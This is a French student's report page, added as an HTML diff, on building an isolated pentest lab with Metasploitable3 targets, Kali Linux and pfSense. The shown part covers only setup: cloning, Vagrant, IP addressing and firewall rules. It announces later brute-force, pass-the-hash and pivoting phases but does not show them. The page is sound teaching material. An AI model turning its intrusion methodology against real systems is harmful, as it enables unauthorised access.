@@ -1,0 +1,2707 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Virtual Lab - Pentest avec Metasploit</title>
+    <link rel="stylesheet" href="data:text/javascript;base64,aW1wb3J0ICcuL3N0eWxlLmNzcycKaW1wb3J0ICcuL215c2NyaXB0LmpzJwppbXBvcnQgamF2YXNjcmlwdExvZ28gZnJvbSAnLi9qYXZhc2NyaXB0LnN2ZycKaW1wb3J0IHZpdGVMb2dvIGZyb20gJy92aXRlLnN2ZycKaW1wb3J0IHsgc2V0dXBDb3VudGVyIH0gZnJvbSAnLi9jb3VudGVyLmpzJwoKZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2FwcCcpLmlubmVySFRNTCA9IGAKICA8ZGl2PgogICAgPGEgaHJlZj0iaHR0cHM6Ly92aXRlLmRldiIgdGFyZ2V0PSJfYmxhbmsiPgogICAgICA8aW1nIHNyYz0iJHt2aXRlTG9nb30iIGNsYXNzPSJsb2dvIiBhbHQ9IlZpdGUgbG9nbyIgLz4KICAgIDwvYT4KICAgIDxhIGhyZWY9Imh0dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL2VuLVVTL2RvY3MvV2ViL0phdmFTY3JpcHQiIHRhcmdldD0iX2JsYW5rIj4KICAgICAgPGltZyBzcmM9IiR7amF2YXNjcmlwdExvZ299IiBjbGFzcz0ibG9nbyB2YW5pbGxhIiBhbHQ9IkphdmFTY3JpcHQgbG9nbyIgLz4KICAgIDwvYT4KICAgIDxoMT5IZWxsbyBWaXRlITwvaDE+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGJ1dHRvbiBpZD0iY291bnRlciIgdHlwZT0iYnV0dG9uIj48L2J1dHRvbj4KICAgIDwvZGl2PgogICAgPHAgY2xhc3M9InJlYWQtdGhlLWRvY3MiPgogICAgICBDbGljayBvbiB0aGUgVml0ZSBsb2dvIHRvIGxlYXJuIG1vcmUKICAgIDwvcD4KICA8L2Rpdj4KYAoKc2V0dXBDb3VudGVyKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjb3VudGVyJykpCg==" />
+    <script type="module" crossorigin src="/assets/index-BFyiiJcI.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-NO_gcMUc.css">
+  </head>
+  <body>
+    <div class="header">
+      <h1>🔒 Virtual Lab - Pentest avec Metasploit</h1>
+      <p class="subtitle">
+        Rapport académique sur la sécurité offensive et les tests d'intrusion
+      </p>
+
+      <div class="badges">
+        <span class="badge">🛡️ Cybersécurité</span>
+        <span class="badge">🔍 Pentest</span>
+        <span class="badge">⚙️ Metasploit</span>
+        <span class="badge">🌐 pfSense</span>
+        <span class="badge">🖥️ Virtual Lab</span>
+      </div>
+
+      <div class="meta-bar">
+        <!-- Photo cliquable vers ton dépôt -->
+        <a class="avatar-link"
+          href="https://github.com/idom97"
+          target="_blank" rel="noopener noreferrer">
+          <img class="author-photo" src="/assets/me-DpLtazNz.webp" alt="Photo de l’auteur" width="250" height="250">
+        </a>
+
+        <div class="meta-text">
+          <div class="byline">
+            <span class="author-name">Dominique ERIN</span>
+
+            <!-- Bouton style Medium (tu peux mettre profil ou dépôt) -->
+            <a class="follow-btn"
+              href="https://github.com/idom97"
+              target="_blank" rel="noopener noreferrer">
+              Follow Me!
+            </a>
+          </div>
+
+          <div class="meta-sub">
+            <span>5 min read</span>
+            <span class="dot">•</span>
+            <time datetime="2026-01-08">8 janv. 2026</time>
+            <span class="dot">•</span>
+          </div>
+        </div>
+      </div>
+      <hr class="header-sep">
+    </div>
+    <div class="container">
+      <div class="section">
+        <h2>📋 À propos du projet</h2>
+        <div class="highlight-box">
+          <p>
+            J'ai réalisé ce projet dans le cadre de ma troisième année de licence informatique sous la direction du
+            Professeur Philippe KISLIN, Enseignant-Chercheur en Informatique à l'IED (Institut d'Enseignement à Distance)
+            de l'Université Paris 8 Vincennes.<br>
+            Sur cette page, je présente les étapes de mise en place de mon laboratoire virtuel complet de test d'intrusion
+            utilisant le Framework <strong>Metasploit</strong>. Le projet démontre une méthodologie professionnelle de pentest, de la reconnaissance
+            réseau à l'exploitation avancée avec la création d'une route (pivoting).
+          </p>
+        </div>
+      </div>
+      <div class="section">
+        <h2>🎯 Objectifs du projet</h2>
+        <div class="highlight-box">
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>
+              Mettre en place un environnement virtuel sécurisé pour les tests
+              d'intrusion
+            </li>
+            <li>
+              Configurer un pare-feu pfSense avec règles de filtrage
+              personnalisées
+            </li>
+            <li>Exploiter des vulnérabilités avec Metasploit Framework</li>
+            <li>
+              Réaliser des attaques avancées (pivoting, pass-the-hash, brute
+              force)
+            </li>
+            <li>
+              Documenter les techniques d'exploitation et recommandations de
+              sécurité
+            </li>
+          </ul>
+        </div>
+      </div>
+      <div class="section">
+        <h2>🎓 Compétences développées</h2>
+        <div class="highlight-box">
+          <ul style="margin-left: 1.5rem">
+            <li>
+              <strong>Reconnaissance réseau</strong> : Nmap, arp-scan,
+              énumération de services
+            </li>
+            <li>
+              <strong>Exploitation de vulnérabilités</strong> : Metasploit,
+              attaques brute force, exploitation MySQL
+            </li>
+            <li>
+              <strong>Post-exploitation</strong> : Meterpreter, extraction de
+              hash, pass-the-hash
+            </li>
+            <li>
+              <strong>Techniques avancées</strong> : Pivoting, proxy SOCKS,
+              routage réseau
+            </li>
+            <li>
+              <strong>Craquage de mots de passe</strong> : John the Ripper,
+              analyse de hashes
+            </li>
+            <li>
+              <strong>Configuration pare-feu</strong> : pfSense, règles de
+              filtrage, segmentation réseau
+            </li>
+            <li>
+              <strong>Accès à distance</strong> : RDP, FTP, contrôle graphique
+            </li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="section" id="menu-rapport">
+        <h2>📚 Contenu Détaillé du Rapport</h2>
+        <div class="tools-grid">
+          <div class="tool-card tool-toggle">
+            <div class="tool-icon">🎯</div>
+            <div class="tool-name">Metasploit 6</div>
+            <a href="#metasploit-install" class="tool-desc-link">
+              <div class="tool-desc">
+                Présentation et installation du Framework
+              </div>
+            </a>
+          </div>
+
+          <div class="tool-card tool-toggle">
+            <div class="tool-icon">⚙️</div>
+            <div class="tool-name">Laboratoire virtuel</div>
+            <a href="#config-reseau-detail" class="tool-desc-link">
+              <div class="tool-desc">
+                Configuration réseau des machines cibles et de la machine
+                attaquante
+              </div>
+            </a>
+          </div>
+
+          <div class="tool-card tool-toggle">
+            <div class="tool-icon">🛡️</div>
+            <div class="tool-name">pfSense</div>
+            <a href="#pfsense-detail" class="tool-desc-link">
+              <div class="tool-desc">
+                Organisation du réseau avec Pare-feu et routeur open source
+              </div>
+            </a>
+          </div>
+
+          <div class="tool-card large-grouping-card tool-toggle">
+            <div class="tool-icon">💣</div>
+            <div class="tool-name">Phases d'attaques / Outils Pentest</div>
+            <a href="#outils-pentest-resume" class="tool-desc-link">
+              <div class="tool-desc">
+                Outils clés utilisés pour l'exploitation et la
+                post-exploitation.
+              </div>
+            </a>
+
+            <div class="grouped-tools-list">
+              <a href="#arp-scan" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🔍</div>
+                  <div class="label">Arp-scan: Découverte du réseau</div>
+                </div>
+              </a>
+              <a href="#nmap-scan" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🔍</div>
+                  <div class="label">Nmap: Scan et énumération</div>
+                </div>
+              </a>
+              <a href="#meterpreter-payload" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🌐</div>
+                  <div class="label">Meterpreter: Payload avancé</div>
+                </div>
+              </a>
+              <!--id="analyse-reseau-pivot"-->
+              <a href="#analyse-reseau-pivot" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🔍</div>
+                  <div class="label">
+                    Analyse réseau et mise en place d'un pivot
+                  </div>
+                </div>
+              </a>
+              <!---->
+              <a href="#vulnérabilités" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🔍</div>
+                  <div class="label">
+                    Recherche de vulnérabilités avant intrusion
+                  </div>
+                </div>
+              </a>
+              <!---->
+              <a href="#intrusion" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🔓</div>
+                  <div class="label">
+                    Tentative d'intrusion par Attaque Brute Force
+                  </div>
+                </div>
+              </a>
+              <a href="#usurpation" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">🔓</div>
+                  <div class="label">Tentative d'intrusion par usurpation des mots de passe système</div>
+                </div>
+              </a>
+              <!---->
+              <a href="#graphique" class="grouped-tool-link">
+                <div class="grouped-tool-item">
+                  <div class="icon">💻</div>
+                  <div class="label">Activation du contrôle à distance en mode graphique sur la machine compromise</div>
+                </div>
+              </a>
+            </div>
+          </div>
+
+          <div class="tool-card tool-toggle">
+            <div class="tool-icon">📋</div>
+            <div class="tool-name">Synthèse</div>
+            <a href="#synth" class="tool-desc-link">
+              <div class="tool-desc">
+                Synthèse de l'intrusion
+              </div>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <div class="section content-section" id="metasploit-install">
+        <h2>🎯 Présentation du Metasploit Framework</h2>
+
+        <p>
+          Metasploit n’est pas simplement un outil, c’est un véritable framework
+          développé à l’origine par H.D. Moore en 2003. Son objectif était de
+          faciliter le travail des professionnels de la cybersécurité en
+          automatisant les tâches répétitives liées aux tests d’intrusion,
+          notamment la création, l’adaptation et l’exécution d’exploits. Au lieu
+          de repartir de zéro à chaque test, Metasploit permet de gagner un
+          temps précieux en réutilisant des modules préexistants.
+        </p>
+        <p>
+          Le framework, initialement écrit en Perl puis réécrit en Ruby, a connu
+          un grand succès dans la communauté de la cybersécurité. Il a été par
+          la suite acquis par la société Rapid7, spécialisée dans l’analyse de
+          vulnérabilités.
+        </p>
+        <p>
+          Aujourd’hui, Metasploit contient plus de 2 400 modules d’exploits,
+          ainsi que de nombreux modules destinés aux phases pré et
+          post-exploitation. Il permet non seulement de sélectionner des
+          attaques selon le contexte (grâce à une vaste bibliothèque en ligne),
+          mais aussi de créer des scripts personnalisés pour automatiser
+          certaines étapes complexes du pentest.
+        </p>
+        <p>
+          En résumé, Metasploit est un véritable couteau suisse du test
+          d’intrusion, capable d’accompagner un pentesteur du début à la fin de
+          son audit de sécurité.
+        </p>
+        <h2>🎯 Installation de Metasploit Framework</h2>
+        <p>
+          D’après les consignes présentes sur le dépôt GitHub du framework 4, en
+          plus d’avoir installé un logiciel de virtualisation (nous avons retenu
+          VirtualBox), il sera nécessaire d’installer les éléments suivants:
+        </p>
+
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>Packer 5</li>
+          <li>Vagrant 6</li>
+          <li>Vagrant Reload Plugin 7</li>
+        </ul>
+        <p>
+          Une fois ces éléments installés, nous avons procédé comme suit pour
+          mettre en place notre environnement:
+        </p>
+
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>Clonage du dépôt</li>
+          <!---->
+          Nous avons téléchargé le contenu complet du projet Metasploitable3 en
+          local à l’aide de l’outil git et de la commande suivante:
+          <!---->
+          <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">git clone https://github.com/rapid7/metasploitable3.git
+            </code></pre>
+          </figure>
+        </div>
+            
+          <!--- Figure 1 – Clônage du dépôt GitHub de Metasploit 3 -->
+          <img src="/assets/CE2-sM_-2VjM.png" width="800" />
+          <figcaption>
+            Figure 1 – Clônage du dépôt GitHub de Metasploit 3
+          </figcaption>
+          <!--- Figure 2 – Clônage complet du dépôt GitHub de Metasploit 3-->
+          <img src="/assets/CE3-BK9IERwn.png" width="800" />
+          <figcaption>
+            Figure 2 – Clônage complet du dépôt GitHub de Metasploit 3
+          </figcaption>
+          <li>Création de sous-dossiers par machine</li>
+          <!---->
+          <p>
+            Dans le répertoire du projet cloné, nous avons créé un dossier dédié
+            à chaque machine virtuelle à installer. Ensuite, nous avons utilisé
+            la commande <strong>vagrant init</strong> pour initialiser la
+            configuration spécifique à chaque machine, puis
+            <strong>vagrant up </strong> pour télécharger l’image
+            correspondante, configurer automatiquement la machine virtuelle et
+            la démarrer dans VirtualBox.
+          </p>
+
+          <li>Installation de Windows Server 2008 dans win2k8;</li>
+          <!---->
+          <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ PS C:\Users\iDom\metasploitable3> mkdir ubuntu1404
+PS C:\Users\iDom\metasploitable3> mkdir win2k8
+PS C:\Users\iDom\metasploitable3> cd win2k8
+PS C:\Users\iDom\metasploitable3\win2k8> vagrant init rapid7/metasploitable3-win2k8
+PS C:\Users\iDom\metasploitable3\win2k8> vagrant up
+            </code></pre>
+          </figure>
+        </div>
+          <!--- Figure 3 – 
+              Installation de la machine virtuelle Win 2008-->
+          <img src="/assets/CE4-BQw-_BC-.png" width="700" />
+          <figcaption>
+            Figure 3 – Installation de la machine virtuelle Win 2008
+          </figcaption>
+          <li>Installation de Ubuntu 14.04 dans ubuntu1404;</li>
+          <!---->
+          <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ PS C:\Users\iDom\metasploitable3> mkdir ubuntu1404
+PS C:\Users\iDom\metasploitable3> cd ubuntu1404
+PS C:\Users\iDom\metasploitable3\ubuntu1404> vagrant init rapid7/metasploitable3-ub1404
+PS C:\Users\iDom\metasploitable3\ubuntu1404> vagrant up
+            </code></pre>
+          </figure>
+        </div>
+          
+          <!--Installation de la machine virtuelle Ubuntu14.04-->
+          <img src="/assets/CE7-BxZrvim7.png" width="700" />
+          <figcaption>
+            Figure 6 – Installation de la machine virtuelle Ubuntu14.04
+          </figcaption>
+          <li>Installation de Kali Linux.</li>
+          <!---->
+          <p>
+            Nous avons simplement télécharger son image depuis le site officiel,
+            puis installer celle-ci, comme on le voit sur les captures d'écrans
+            ci-dessous.
+          </p>
+          <img src="/assets/CE11-CKuwvoPT.png" width="700" />
+          <figcaption>
+            Figure 7 – Téléchargement de l'image de Kali Linux
+          </figcaption>
+          <img src="/assets/CE12-CeUJ7nfF.png" width="700" />
+          <figcaption>
+            Figure 8 – Installation de la machine virtuelle Kali Linux
+          </figcaption>
+        </ul>
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="config-reseau-detail">
+        <h2>⚙️ Configuration réseau de l'environnement virtuel</h2>
+        <!----->
+        <p>
+          Dans cette section, nous allons présenter les différentes étapes qui
+          nous ont permis de mettre en place un réseau local entre les machines
+          virtuelles Ubuntu 14.04 et Windows 2008, ainsi qu’une connexion
+          internet entre les machines Windows 2008 et Kali Linux.
+        </p>
+        <p>
+          On utilisera le routeur gratuit Pfsense pour réaliser notre
+          configuration réseau.
+        </p>
+        <h2>
+          ⚙️ Configuration du réseau privé et du réseau interne dans Virtualbox
+        </h2>
+        <!---->
+        <p>
+          Notre objectif est de mettre en place deux réseaux virtuels distincts
+          dans VirtualBox afin de simuler un scénario de segmentation réseau :
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>
+            <strong> Un réseau Réseau privé hôte</strong> (VirtualBox Host-Only
+            Ethernet Adapter) pour les communications entre l’hôte physique et
+            certaines machines virtuelles (Kali Linux, Windows Server 2008,
+            pfSense).
+          </li>
+          <li>
+            <strong> Un réseau Réseau interne</strong> (intnet) permettant la
+            communication isolée entre Windows Server 2008 et Ubuntu 14.04, via
+            pfSense.
+          </li>
+        </ul>
+        <!---->
+        <p>
+          Dans VirtualBox, l’outil Network Manager (menu Fichier > Gestionnaire
+          de réseau) permet de visualiser les réseaux Host-only. On constate ici
+          deux réseaux définis :
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>
+            VirtualBox Host-Only Ethernet Adapter avec une adresse IPv4
+            10.10.10.128/24 et le serveur DHCP désactivé.
+          </li>
+          <li>
+            VirtualBox Host-Only Ethernet Adapter #2 avec une adresse IPv4
+            192.168.12.1/24 et le serveur DHCP désactivé.
+          </li>
+        </ul>
+        <p>
+          Ce laboratoire utilisera le premier réseau (10.10.10.128/24) pour
+          relier la machine attaquante, la machine pivot et pfSense sur son
+          interface LAN.
+        </p>
+        <!--CE1-->
+        <img src="/assets/CE1-DFJijJL0.png" width="500" />
+        <figcaption>
+          Figure 9 – Configuration Host-only dans VirtualBox
+        </figcaption>
+
+        <!--CE2-->
+        <img src="/assets/CE2-BOmAS-qr.png" width="500" />
+        <figcaption>
+          Figure 10 – Adresse manuelle du réseau privé hôte
+        </figcaption>
+        <!---->
+        <h2>⚙️ Configuration réseau des machines cibles</h2>
+        <h3>1. Windows Server 2008 : Le Pivot</h3>
+        <p>
+          La machine pivot Windows Server 2008 est présente à la fois sur le
+          réseau interne intnet (Adaptateur 2), dédié à la communication avec la
+          machine Ubuntu 14.04, et sur le réseau relié à Internet Réseau privé
+          hôte (Adaptateur 1 :VirtualBox Host-Only Ethernet Adapter) , utilisé
+          pour la communication avec Kali Linux et pfSense (IP dans le
+          sous-réseau 10.10.10.0/24).
+        </p>
+        <!--CE-->
+        <p>La configuration réseau de la machine virtuelle Windows Server
+           2008 a été réalisée en accédant au Centre Réseau et Partage depuis le menu Démarrer, puis en modifiant les paramètres IPv4 de
+           chaque adaptateur réseau.</p>
+        <p>Les adresses attribuées sont les suivantes :
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>Adaptateur LAN : 10.10.10.2/24 (passerelle 10.10.10.128)</li>
+            <li>Adaptateur WAN : 192.168.100.2/24</li>
+            <li>LAN : 10.10.10.2</li>
+            <li>WAN : 192.168.100.2</li>
+          </ul>
+        </p>
+        <!--CE3-->
+        <img src="/assets/CE3-CJP0-cga.png" width="800" />
+        <figcaption>
+          Figure 11 – Centre Réseau et Partage sous Windows Server 2008
+        </figcaption>
+        <!--CE4-->
+        <img src="/assets/CE4-DEdzAPv_.png" width="800" />
+        <figcaption>
+          Figure 12 – Propriétés de la connexion réseau - Adaptateur 1 (Réseau privé hôte)
+        </figcaption>
+        <!--CE5-->
+        <img src="/assets/CE5-CaBWjVRV.png" width="650" />
+        <figcaption>
+          Figure 13 – Configuration IPv4 – Adaptateur 1 (10.10.10.2/24, passerelle 10.10.10.128)
+        </figcaption>
+        <!--CE6-->
+        <img src="/assets/CE6-DXTEPPDs.png" width="450" />
+        <figcaption>
+          Figure 14 – Statut de la connexion — Adaptateur 1
+        </figcaption>
+        <!--CE7-->
+        <img src="/assets/CE7-CnYHX_Ak.png" width="450" />
+        <figcaption>
+          Figure 15 – Propriétés de la connexion réseau — Adaptateur 2 (Réseau interne)
+        </figcaption>
+        <!--CE8-->
+        <img src="/assets/CE8-CNVTQoVO.png" width="450" />
+        <figcaption>
+          Figure 15 – Configuration IPv4 — Adaptateur 2 (192.168.100.2/24)
+        </figcaption>
+        <!--CE9-->
+        <img src="/assets/CE9-DhFyj5ZZ.png" width="450" />
+        <figcaption>
+          Figure 16 – Adaptateur réseau interne sur Ubuntu 14.04
+        </figcaption>
+        <!--CE10-->
+        <img src="/assets/CE10-B_qHcRbT.png" width="450" />
+        <figcaption>
+          Figure 16 – Adaptateur réseau interne sur Ubuntu 14.04
+        </figcaption>
+        <h3>2. Ubuntu 14.04 : Machine cible ( réseau interne)</h3>
+        <p>
+          La machine Ubuntu 14.04 est connectée uniquement au réseau interne, 
+          intnet (Adaptateur 1 : Réseau interne), pour échanger exclusivement 
+          avec Windows Server 2008.
+        </p>
+        <!--CE11-->
+        <img src="/assets/CE11-De6WLknF.png" width="800" />
+        <figcaption>
+          Figure 17 – Adaptateur réseau interne sur Ubuntu 14.04
+        </figcaption>
+        <p>
+          La configuration réseau de la machine Ubuntu 14.04 a été effectuée uniquement pour l’adaptateur
+          réseau interne (intnet), destiné à communiquer avec Windows Server 2008 via l’adresse IP
+          192.168.100.3/24.
+        </p>
+        <p>
+          Pour réaliser ce paramétrage, nous avons modifié le fichier de configuration des interfaces réseau
+          en exécutant la commande suivante dans le terminal :
+        </p>
+        <!---->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ sudo nano /etc/network/interfaces
+            </code></pre>
+          </figure>
+        </div>
+          
+        <!--Code-->
+        <p>Le contenu du fichier /etc/network/interfaces a été défini comme suit:</p>
+        <!---->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash"># The loopback network interface
+auto lo
+iface lo inet loopback
+# The primary network interface
+auto eth0
+iface eth0 inet static
+address 192.168.100.3
+netmask 255.255.255.0
+            </code></pre>
+          </figure>
+        </div>
+          
+                
+            
+        <!--CE12-->
+        <img src="/assets/CE12-DPOLAJro.png" width="700" />
+        <figcaption>
+          Figure 18 – Connexion à la machine Ubuntu 14.04 et ouverture du fichier /etc/network/interfaces
+        </figcaption>
+        <!--CE13-->
+        <img src="/assets/CE13-Ebx7r2AF.png" width="700" />
+        <figcaption>
+          Figure 19 – Configuration IPv4 statique dans /etc/network/interfaces (192.168.100.3/24)
+        </figcaption>
+        <h2>⚙️ Configuration réseau de la machine attaquante</h2>
+        <h3>1. Kali Linux: Machine attaquante</h3>
+        <p>
+          La machine attaquante Kali Linux est reliée exclusivement au Réseau privé hôte (Adaptateur
+          1: VirtualBox Host-Only Ethernet Adapter), pour communiquer avec Windows Server 2008
+          et pfSense (IP dans le sous-réseau 10.10.10.0/24).
+        </p>
+        <!--CODE-->
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ sudo ip addr add 10.10.10.100/24 dev eth0
+            </code></pre>
+          </figure>
+        </div>
+        <p>
+          Le paramétrage de l’adresse IP a été effectué directement depuis le terminal à l’aide de la
+          commande:
+        </p>
+        
+        <!--CE14-->
+        <img src="/assets/CE14-CU1qcilM.png" width="800" />
+        <figcaption>
+          Figure 20 – Interface réseau privée hôte sur Kali Linux
+        </figcaption>
+
+        <p>
+          Cette configuration permet à Kali Linux de disposer d’une adresse fixe 10.10.10.100/24 sur
+          son interface eth0, utilisée pour initier les attaques vers la machine pivot Windows Server 2008.
+        </p>
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="pfsense-detail">
+        <h2>🛡️ Organisation du réseau avec Pare-feu et routeur open source</h2>
+        <!---->
+         <!----->
+        <p>
+          Le pare-feu <strong>pfSense</strong> a été développé sous le système d'exploitation FreeBSD par Chris Buechler et Scott Ullrich. 
+          Il s'agit d'une solution de sécurité entièrement gratuite et qui d'après le <a href="https://www.pfsense.org/getting-started/">site officiel</a>, 
+          a démontré sa robustesse face à de nombreuses solutions commerciales.
+        </p>
+        <p>
+          On utilisera donc <strongp>pfSense</strong> comme routeur pour réaliser notre configuration réseau.
+        </p>
+        <!---->
+        <h2>⚙️ Installation et configuration de pfSense</h2>
+        Nous utilisons <strong>pfSense</strong> en mode ligne de commande, l’interface graphique 
+        étant difficilement exploitable depuis <strong>Windows Server 2008 R2 Standard</strong>.
+        <!---->
+        <!---->
+        <h3>1. Téléchargement et installation</h3>
+        <p>Nous commençons par télécharger l'ISO d'installation depuis le <a href="https://www.pfsense.org/getting-started/">site officiel</a></p>
+        <!--CE1-->
+        <img src="/assets/CE1-EduORwR9.png" width="500" />
+        <figcaption>
+          Figure 21 – Téléchargement de pfSense depuis le site officiel
+        </figcaption>
+        <p>Après extraction des fichiers téléchargés, nous créons une nouvelle machine virtuelle dans VirtualBox.
+          Nous sélectionnons le type BSD, sous-type FreeBSD (64-bit), et attachons l’image ISO comme disque
+          d’amorçage.
+        </p>
+        <!--CE2-->
+        <img src="/assets/CE2-BYLG8gVX.png" width="500" />
+        <figcaption>
+          Figure 22 – Création de la machine virtuelle pfSense dans VirtualBox
+        </figcaption>
+        <!---->
+         <p>Lors du premier démarrage, l’installateur Netgate se lance. 
+          Nous acceptons les conditions de licence.
+        </p>
+        <!--CE3-->
+        <img src="/assets/CE3-DWjN489g.png" width="500" />
+        <figcaption>
+          Figure 23 – Chargement de l’image ISO et lancement de l’installation
+        </figcaption>
+        <!---->
+        <p>Une fois l’installation terminée, nous retirons l’ISO et redémarrons la machine virtuelle. 
+          pfSense affiche alors son menu principal en console.
+        </p>
+        <!--CE4-->
+        <img src="/assets/CE4-xOFLB00e.png" width="500" />
+        <figcaption>
+          Figure 24 – Menu principal de configuration console pfSense
+        </figcaption>
+        <!---->
+        <!---->
+        <h3>2. Paramétrage de l’interface WAN</h3>
+        <!---->
+        <p>Nous accédons au menu console et choisissons l’option 2: <strong>Set interface(s) IP address</strong>, puis
+        sélectionnons <strong>WAN (em0)</strong>. Nous désactivons le DHCP (n) et configurons l’adresse IPv4 statique
+        192.168.148.128/24 avec comme passerelle 192.168.148.2, définie comme passerelle par défaut (y).
+
+        </p>
+        <!--CE5-->
+        <img src="/assets/CE5-CkLEgZje.png" width="700" />
+        <figcaption>
+          Figure 25 –  Configuration IPv4 statique sur l’interface WAN
+        </figcaption>
+        <!---->
+        <p>Après validation, pfSense applique la configuration et confirme que l’adresse IPv4 du WAN est bien
+            définie sur 192.168.148.128/24
+        </p>
+        <!--CE6-->
+        <img src="/assets/CE6-E89c0zde.png" width="700" />
+        <figcaption>
+          Figure 26 – Confirmation de l’adresse IPv4 sur l’interface WAN
+        </figcaption>
+        <!---->
+        <!---->
+        <h3>3. Paramétrage de l’interface LAN</h3>
+        <p>Nous procédons ensuite à la configuration de l’interface <strong>LAN (em1)</strong> depuis le même menu console.
+          Nous choisissons de ne pas utiliser le DHCP (n) pour l’adresse IPv4 et attribuons l’adresse statique
+          10.10.10.128/24. La passerelle IPv4 reste 10.10.10.128 et nous la définissons comme passerelle par
+          défaut (y).
+        </p>
+        <!--CE5-->
+        <img src="/assets/CE7-CZi-qvGV.png" width="700" />
+        <figcaption>
+          Figure 27 – Sélection de l’interface LAN dans pfSense
+        </figcaption>
+        <!---->
+        <p>Nous désactivons IPv6 (n) puis activons le serveur DHCP sur le LAN (y) avec une plage d’adresses
+           allant de 10.10.10.100 à 10.10.10.200. Après validation, pfSense applique la configuration et confirme que l’adresse IPv4 du LAN est bien
+           définie sur 10.10.10.128/24.
+        </p>
+        <!--CE6-->
+        <img src="/assets/CE8-LNC8wRn8.png" width="700" />
+        <figcaption>
+          Figure 28 – Configuration IPv4 statique et DHCP sur le LAN et Confirmation de l’adresse IPv4 sur l’interface LAN
+        </figcaption>
+        <!---->
+
+        <!---->
+        <h2>⚙️ Définition des règles personnalisées en ligne de commande</h2>
+        <p>Les règles que nous avons mises en place pour le routeur pfSense sont inspirées 
+          de celles proposées par Dustin Noe dans son article sur <a href="https://medium.com/@noe.dustin/advanced-pentesting-lab-with-vmware-vyos-kali-and-metasploitable3-3d0c07419e49">VyOS 11</a>.</p>
+          
+        <p>Lors du paramétrage des interfaces réseau de <strong>pfSense</strong>, nous avons défini:
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>L’interface WAN avec l’adresse IP 192.168.148.2/24</li>
+            <li>L’interface LAN avec l’adresse IP 10.10.10.128/24</li>
+          </ul>
+          Les machines <strong>Windows Server 2008</strong> et <strong>Ubuntu 14.04</strong> sont toutes deux connectées derrière le
+          pare-feu pfSense, sur le réseau LAN.</p>
+        <!---->
+        <!---->
+        <h3>1. Filtrage du trafic entrant</h3>
+        <!---->
+        <p>Pour le trafic entrant, le pare-feu autorise: 
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>Le <strong>trafic établi et associé</strong>, c’est-à-dire les connexions déjà initiées ou attendues (via les
+            protocoles TCP et UDP)</li>
+            <li>Le trafic <strong>entrant spécifique:</strong> une connexion TCP provenant de n’importe quelle adresse à
+            destination de 10.10.10.128 sur le port 8585</li>
+          </ul>
+          En revanche, <strong>tout autre trafic entrant est bloqué</strong>, de manière à forcer tout
+          passage par le routeur, qui joue alors pleinement son rôle de point de contrôle central du réseau.
+        </p>
+        <!---->
+        <!---->
+        <h3>2. Filtrage du trafic sortant</h3>
+        <!---->
+        <p>Pour le trafic sortant, le pare-feu autorise: 
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>Le <strong>trafic établi et associé</strong>, via les protocoles TCP et UDP</li>
+            <li>Le trafic <strong>TCP sortant</strong> vers le port 443, c'est à dire les connexions <strong>HTTPS</strong></li>
+          </ul>
+          <strong>Tout autre trafic sortant est bloqué</strong>, afin de limiter les flux non contrôlé
+          sortant du réseau LAN
+        </p>
+        <!--CE-->
+        <!--CE8-->
+        <img src="/assets/CE9-CP7GXmr0.png" width="700" />
+        <figcaption>
+          Figure 30 – Configuration des règles de trafic entrant et sortant sur la machine pfSense
+        </figcaption>
+        <!---->
+        <!---->
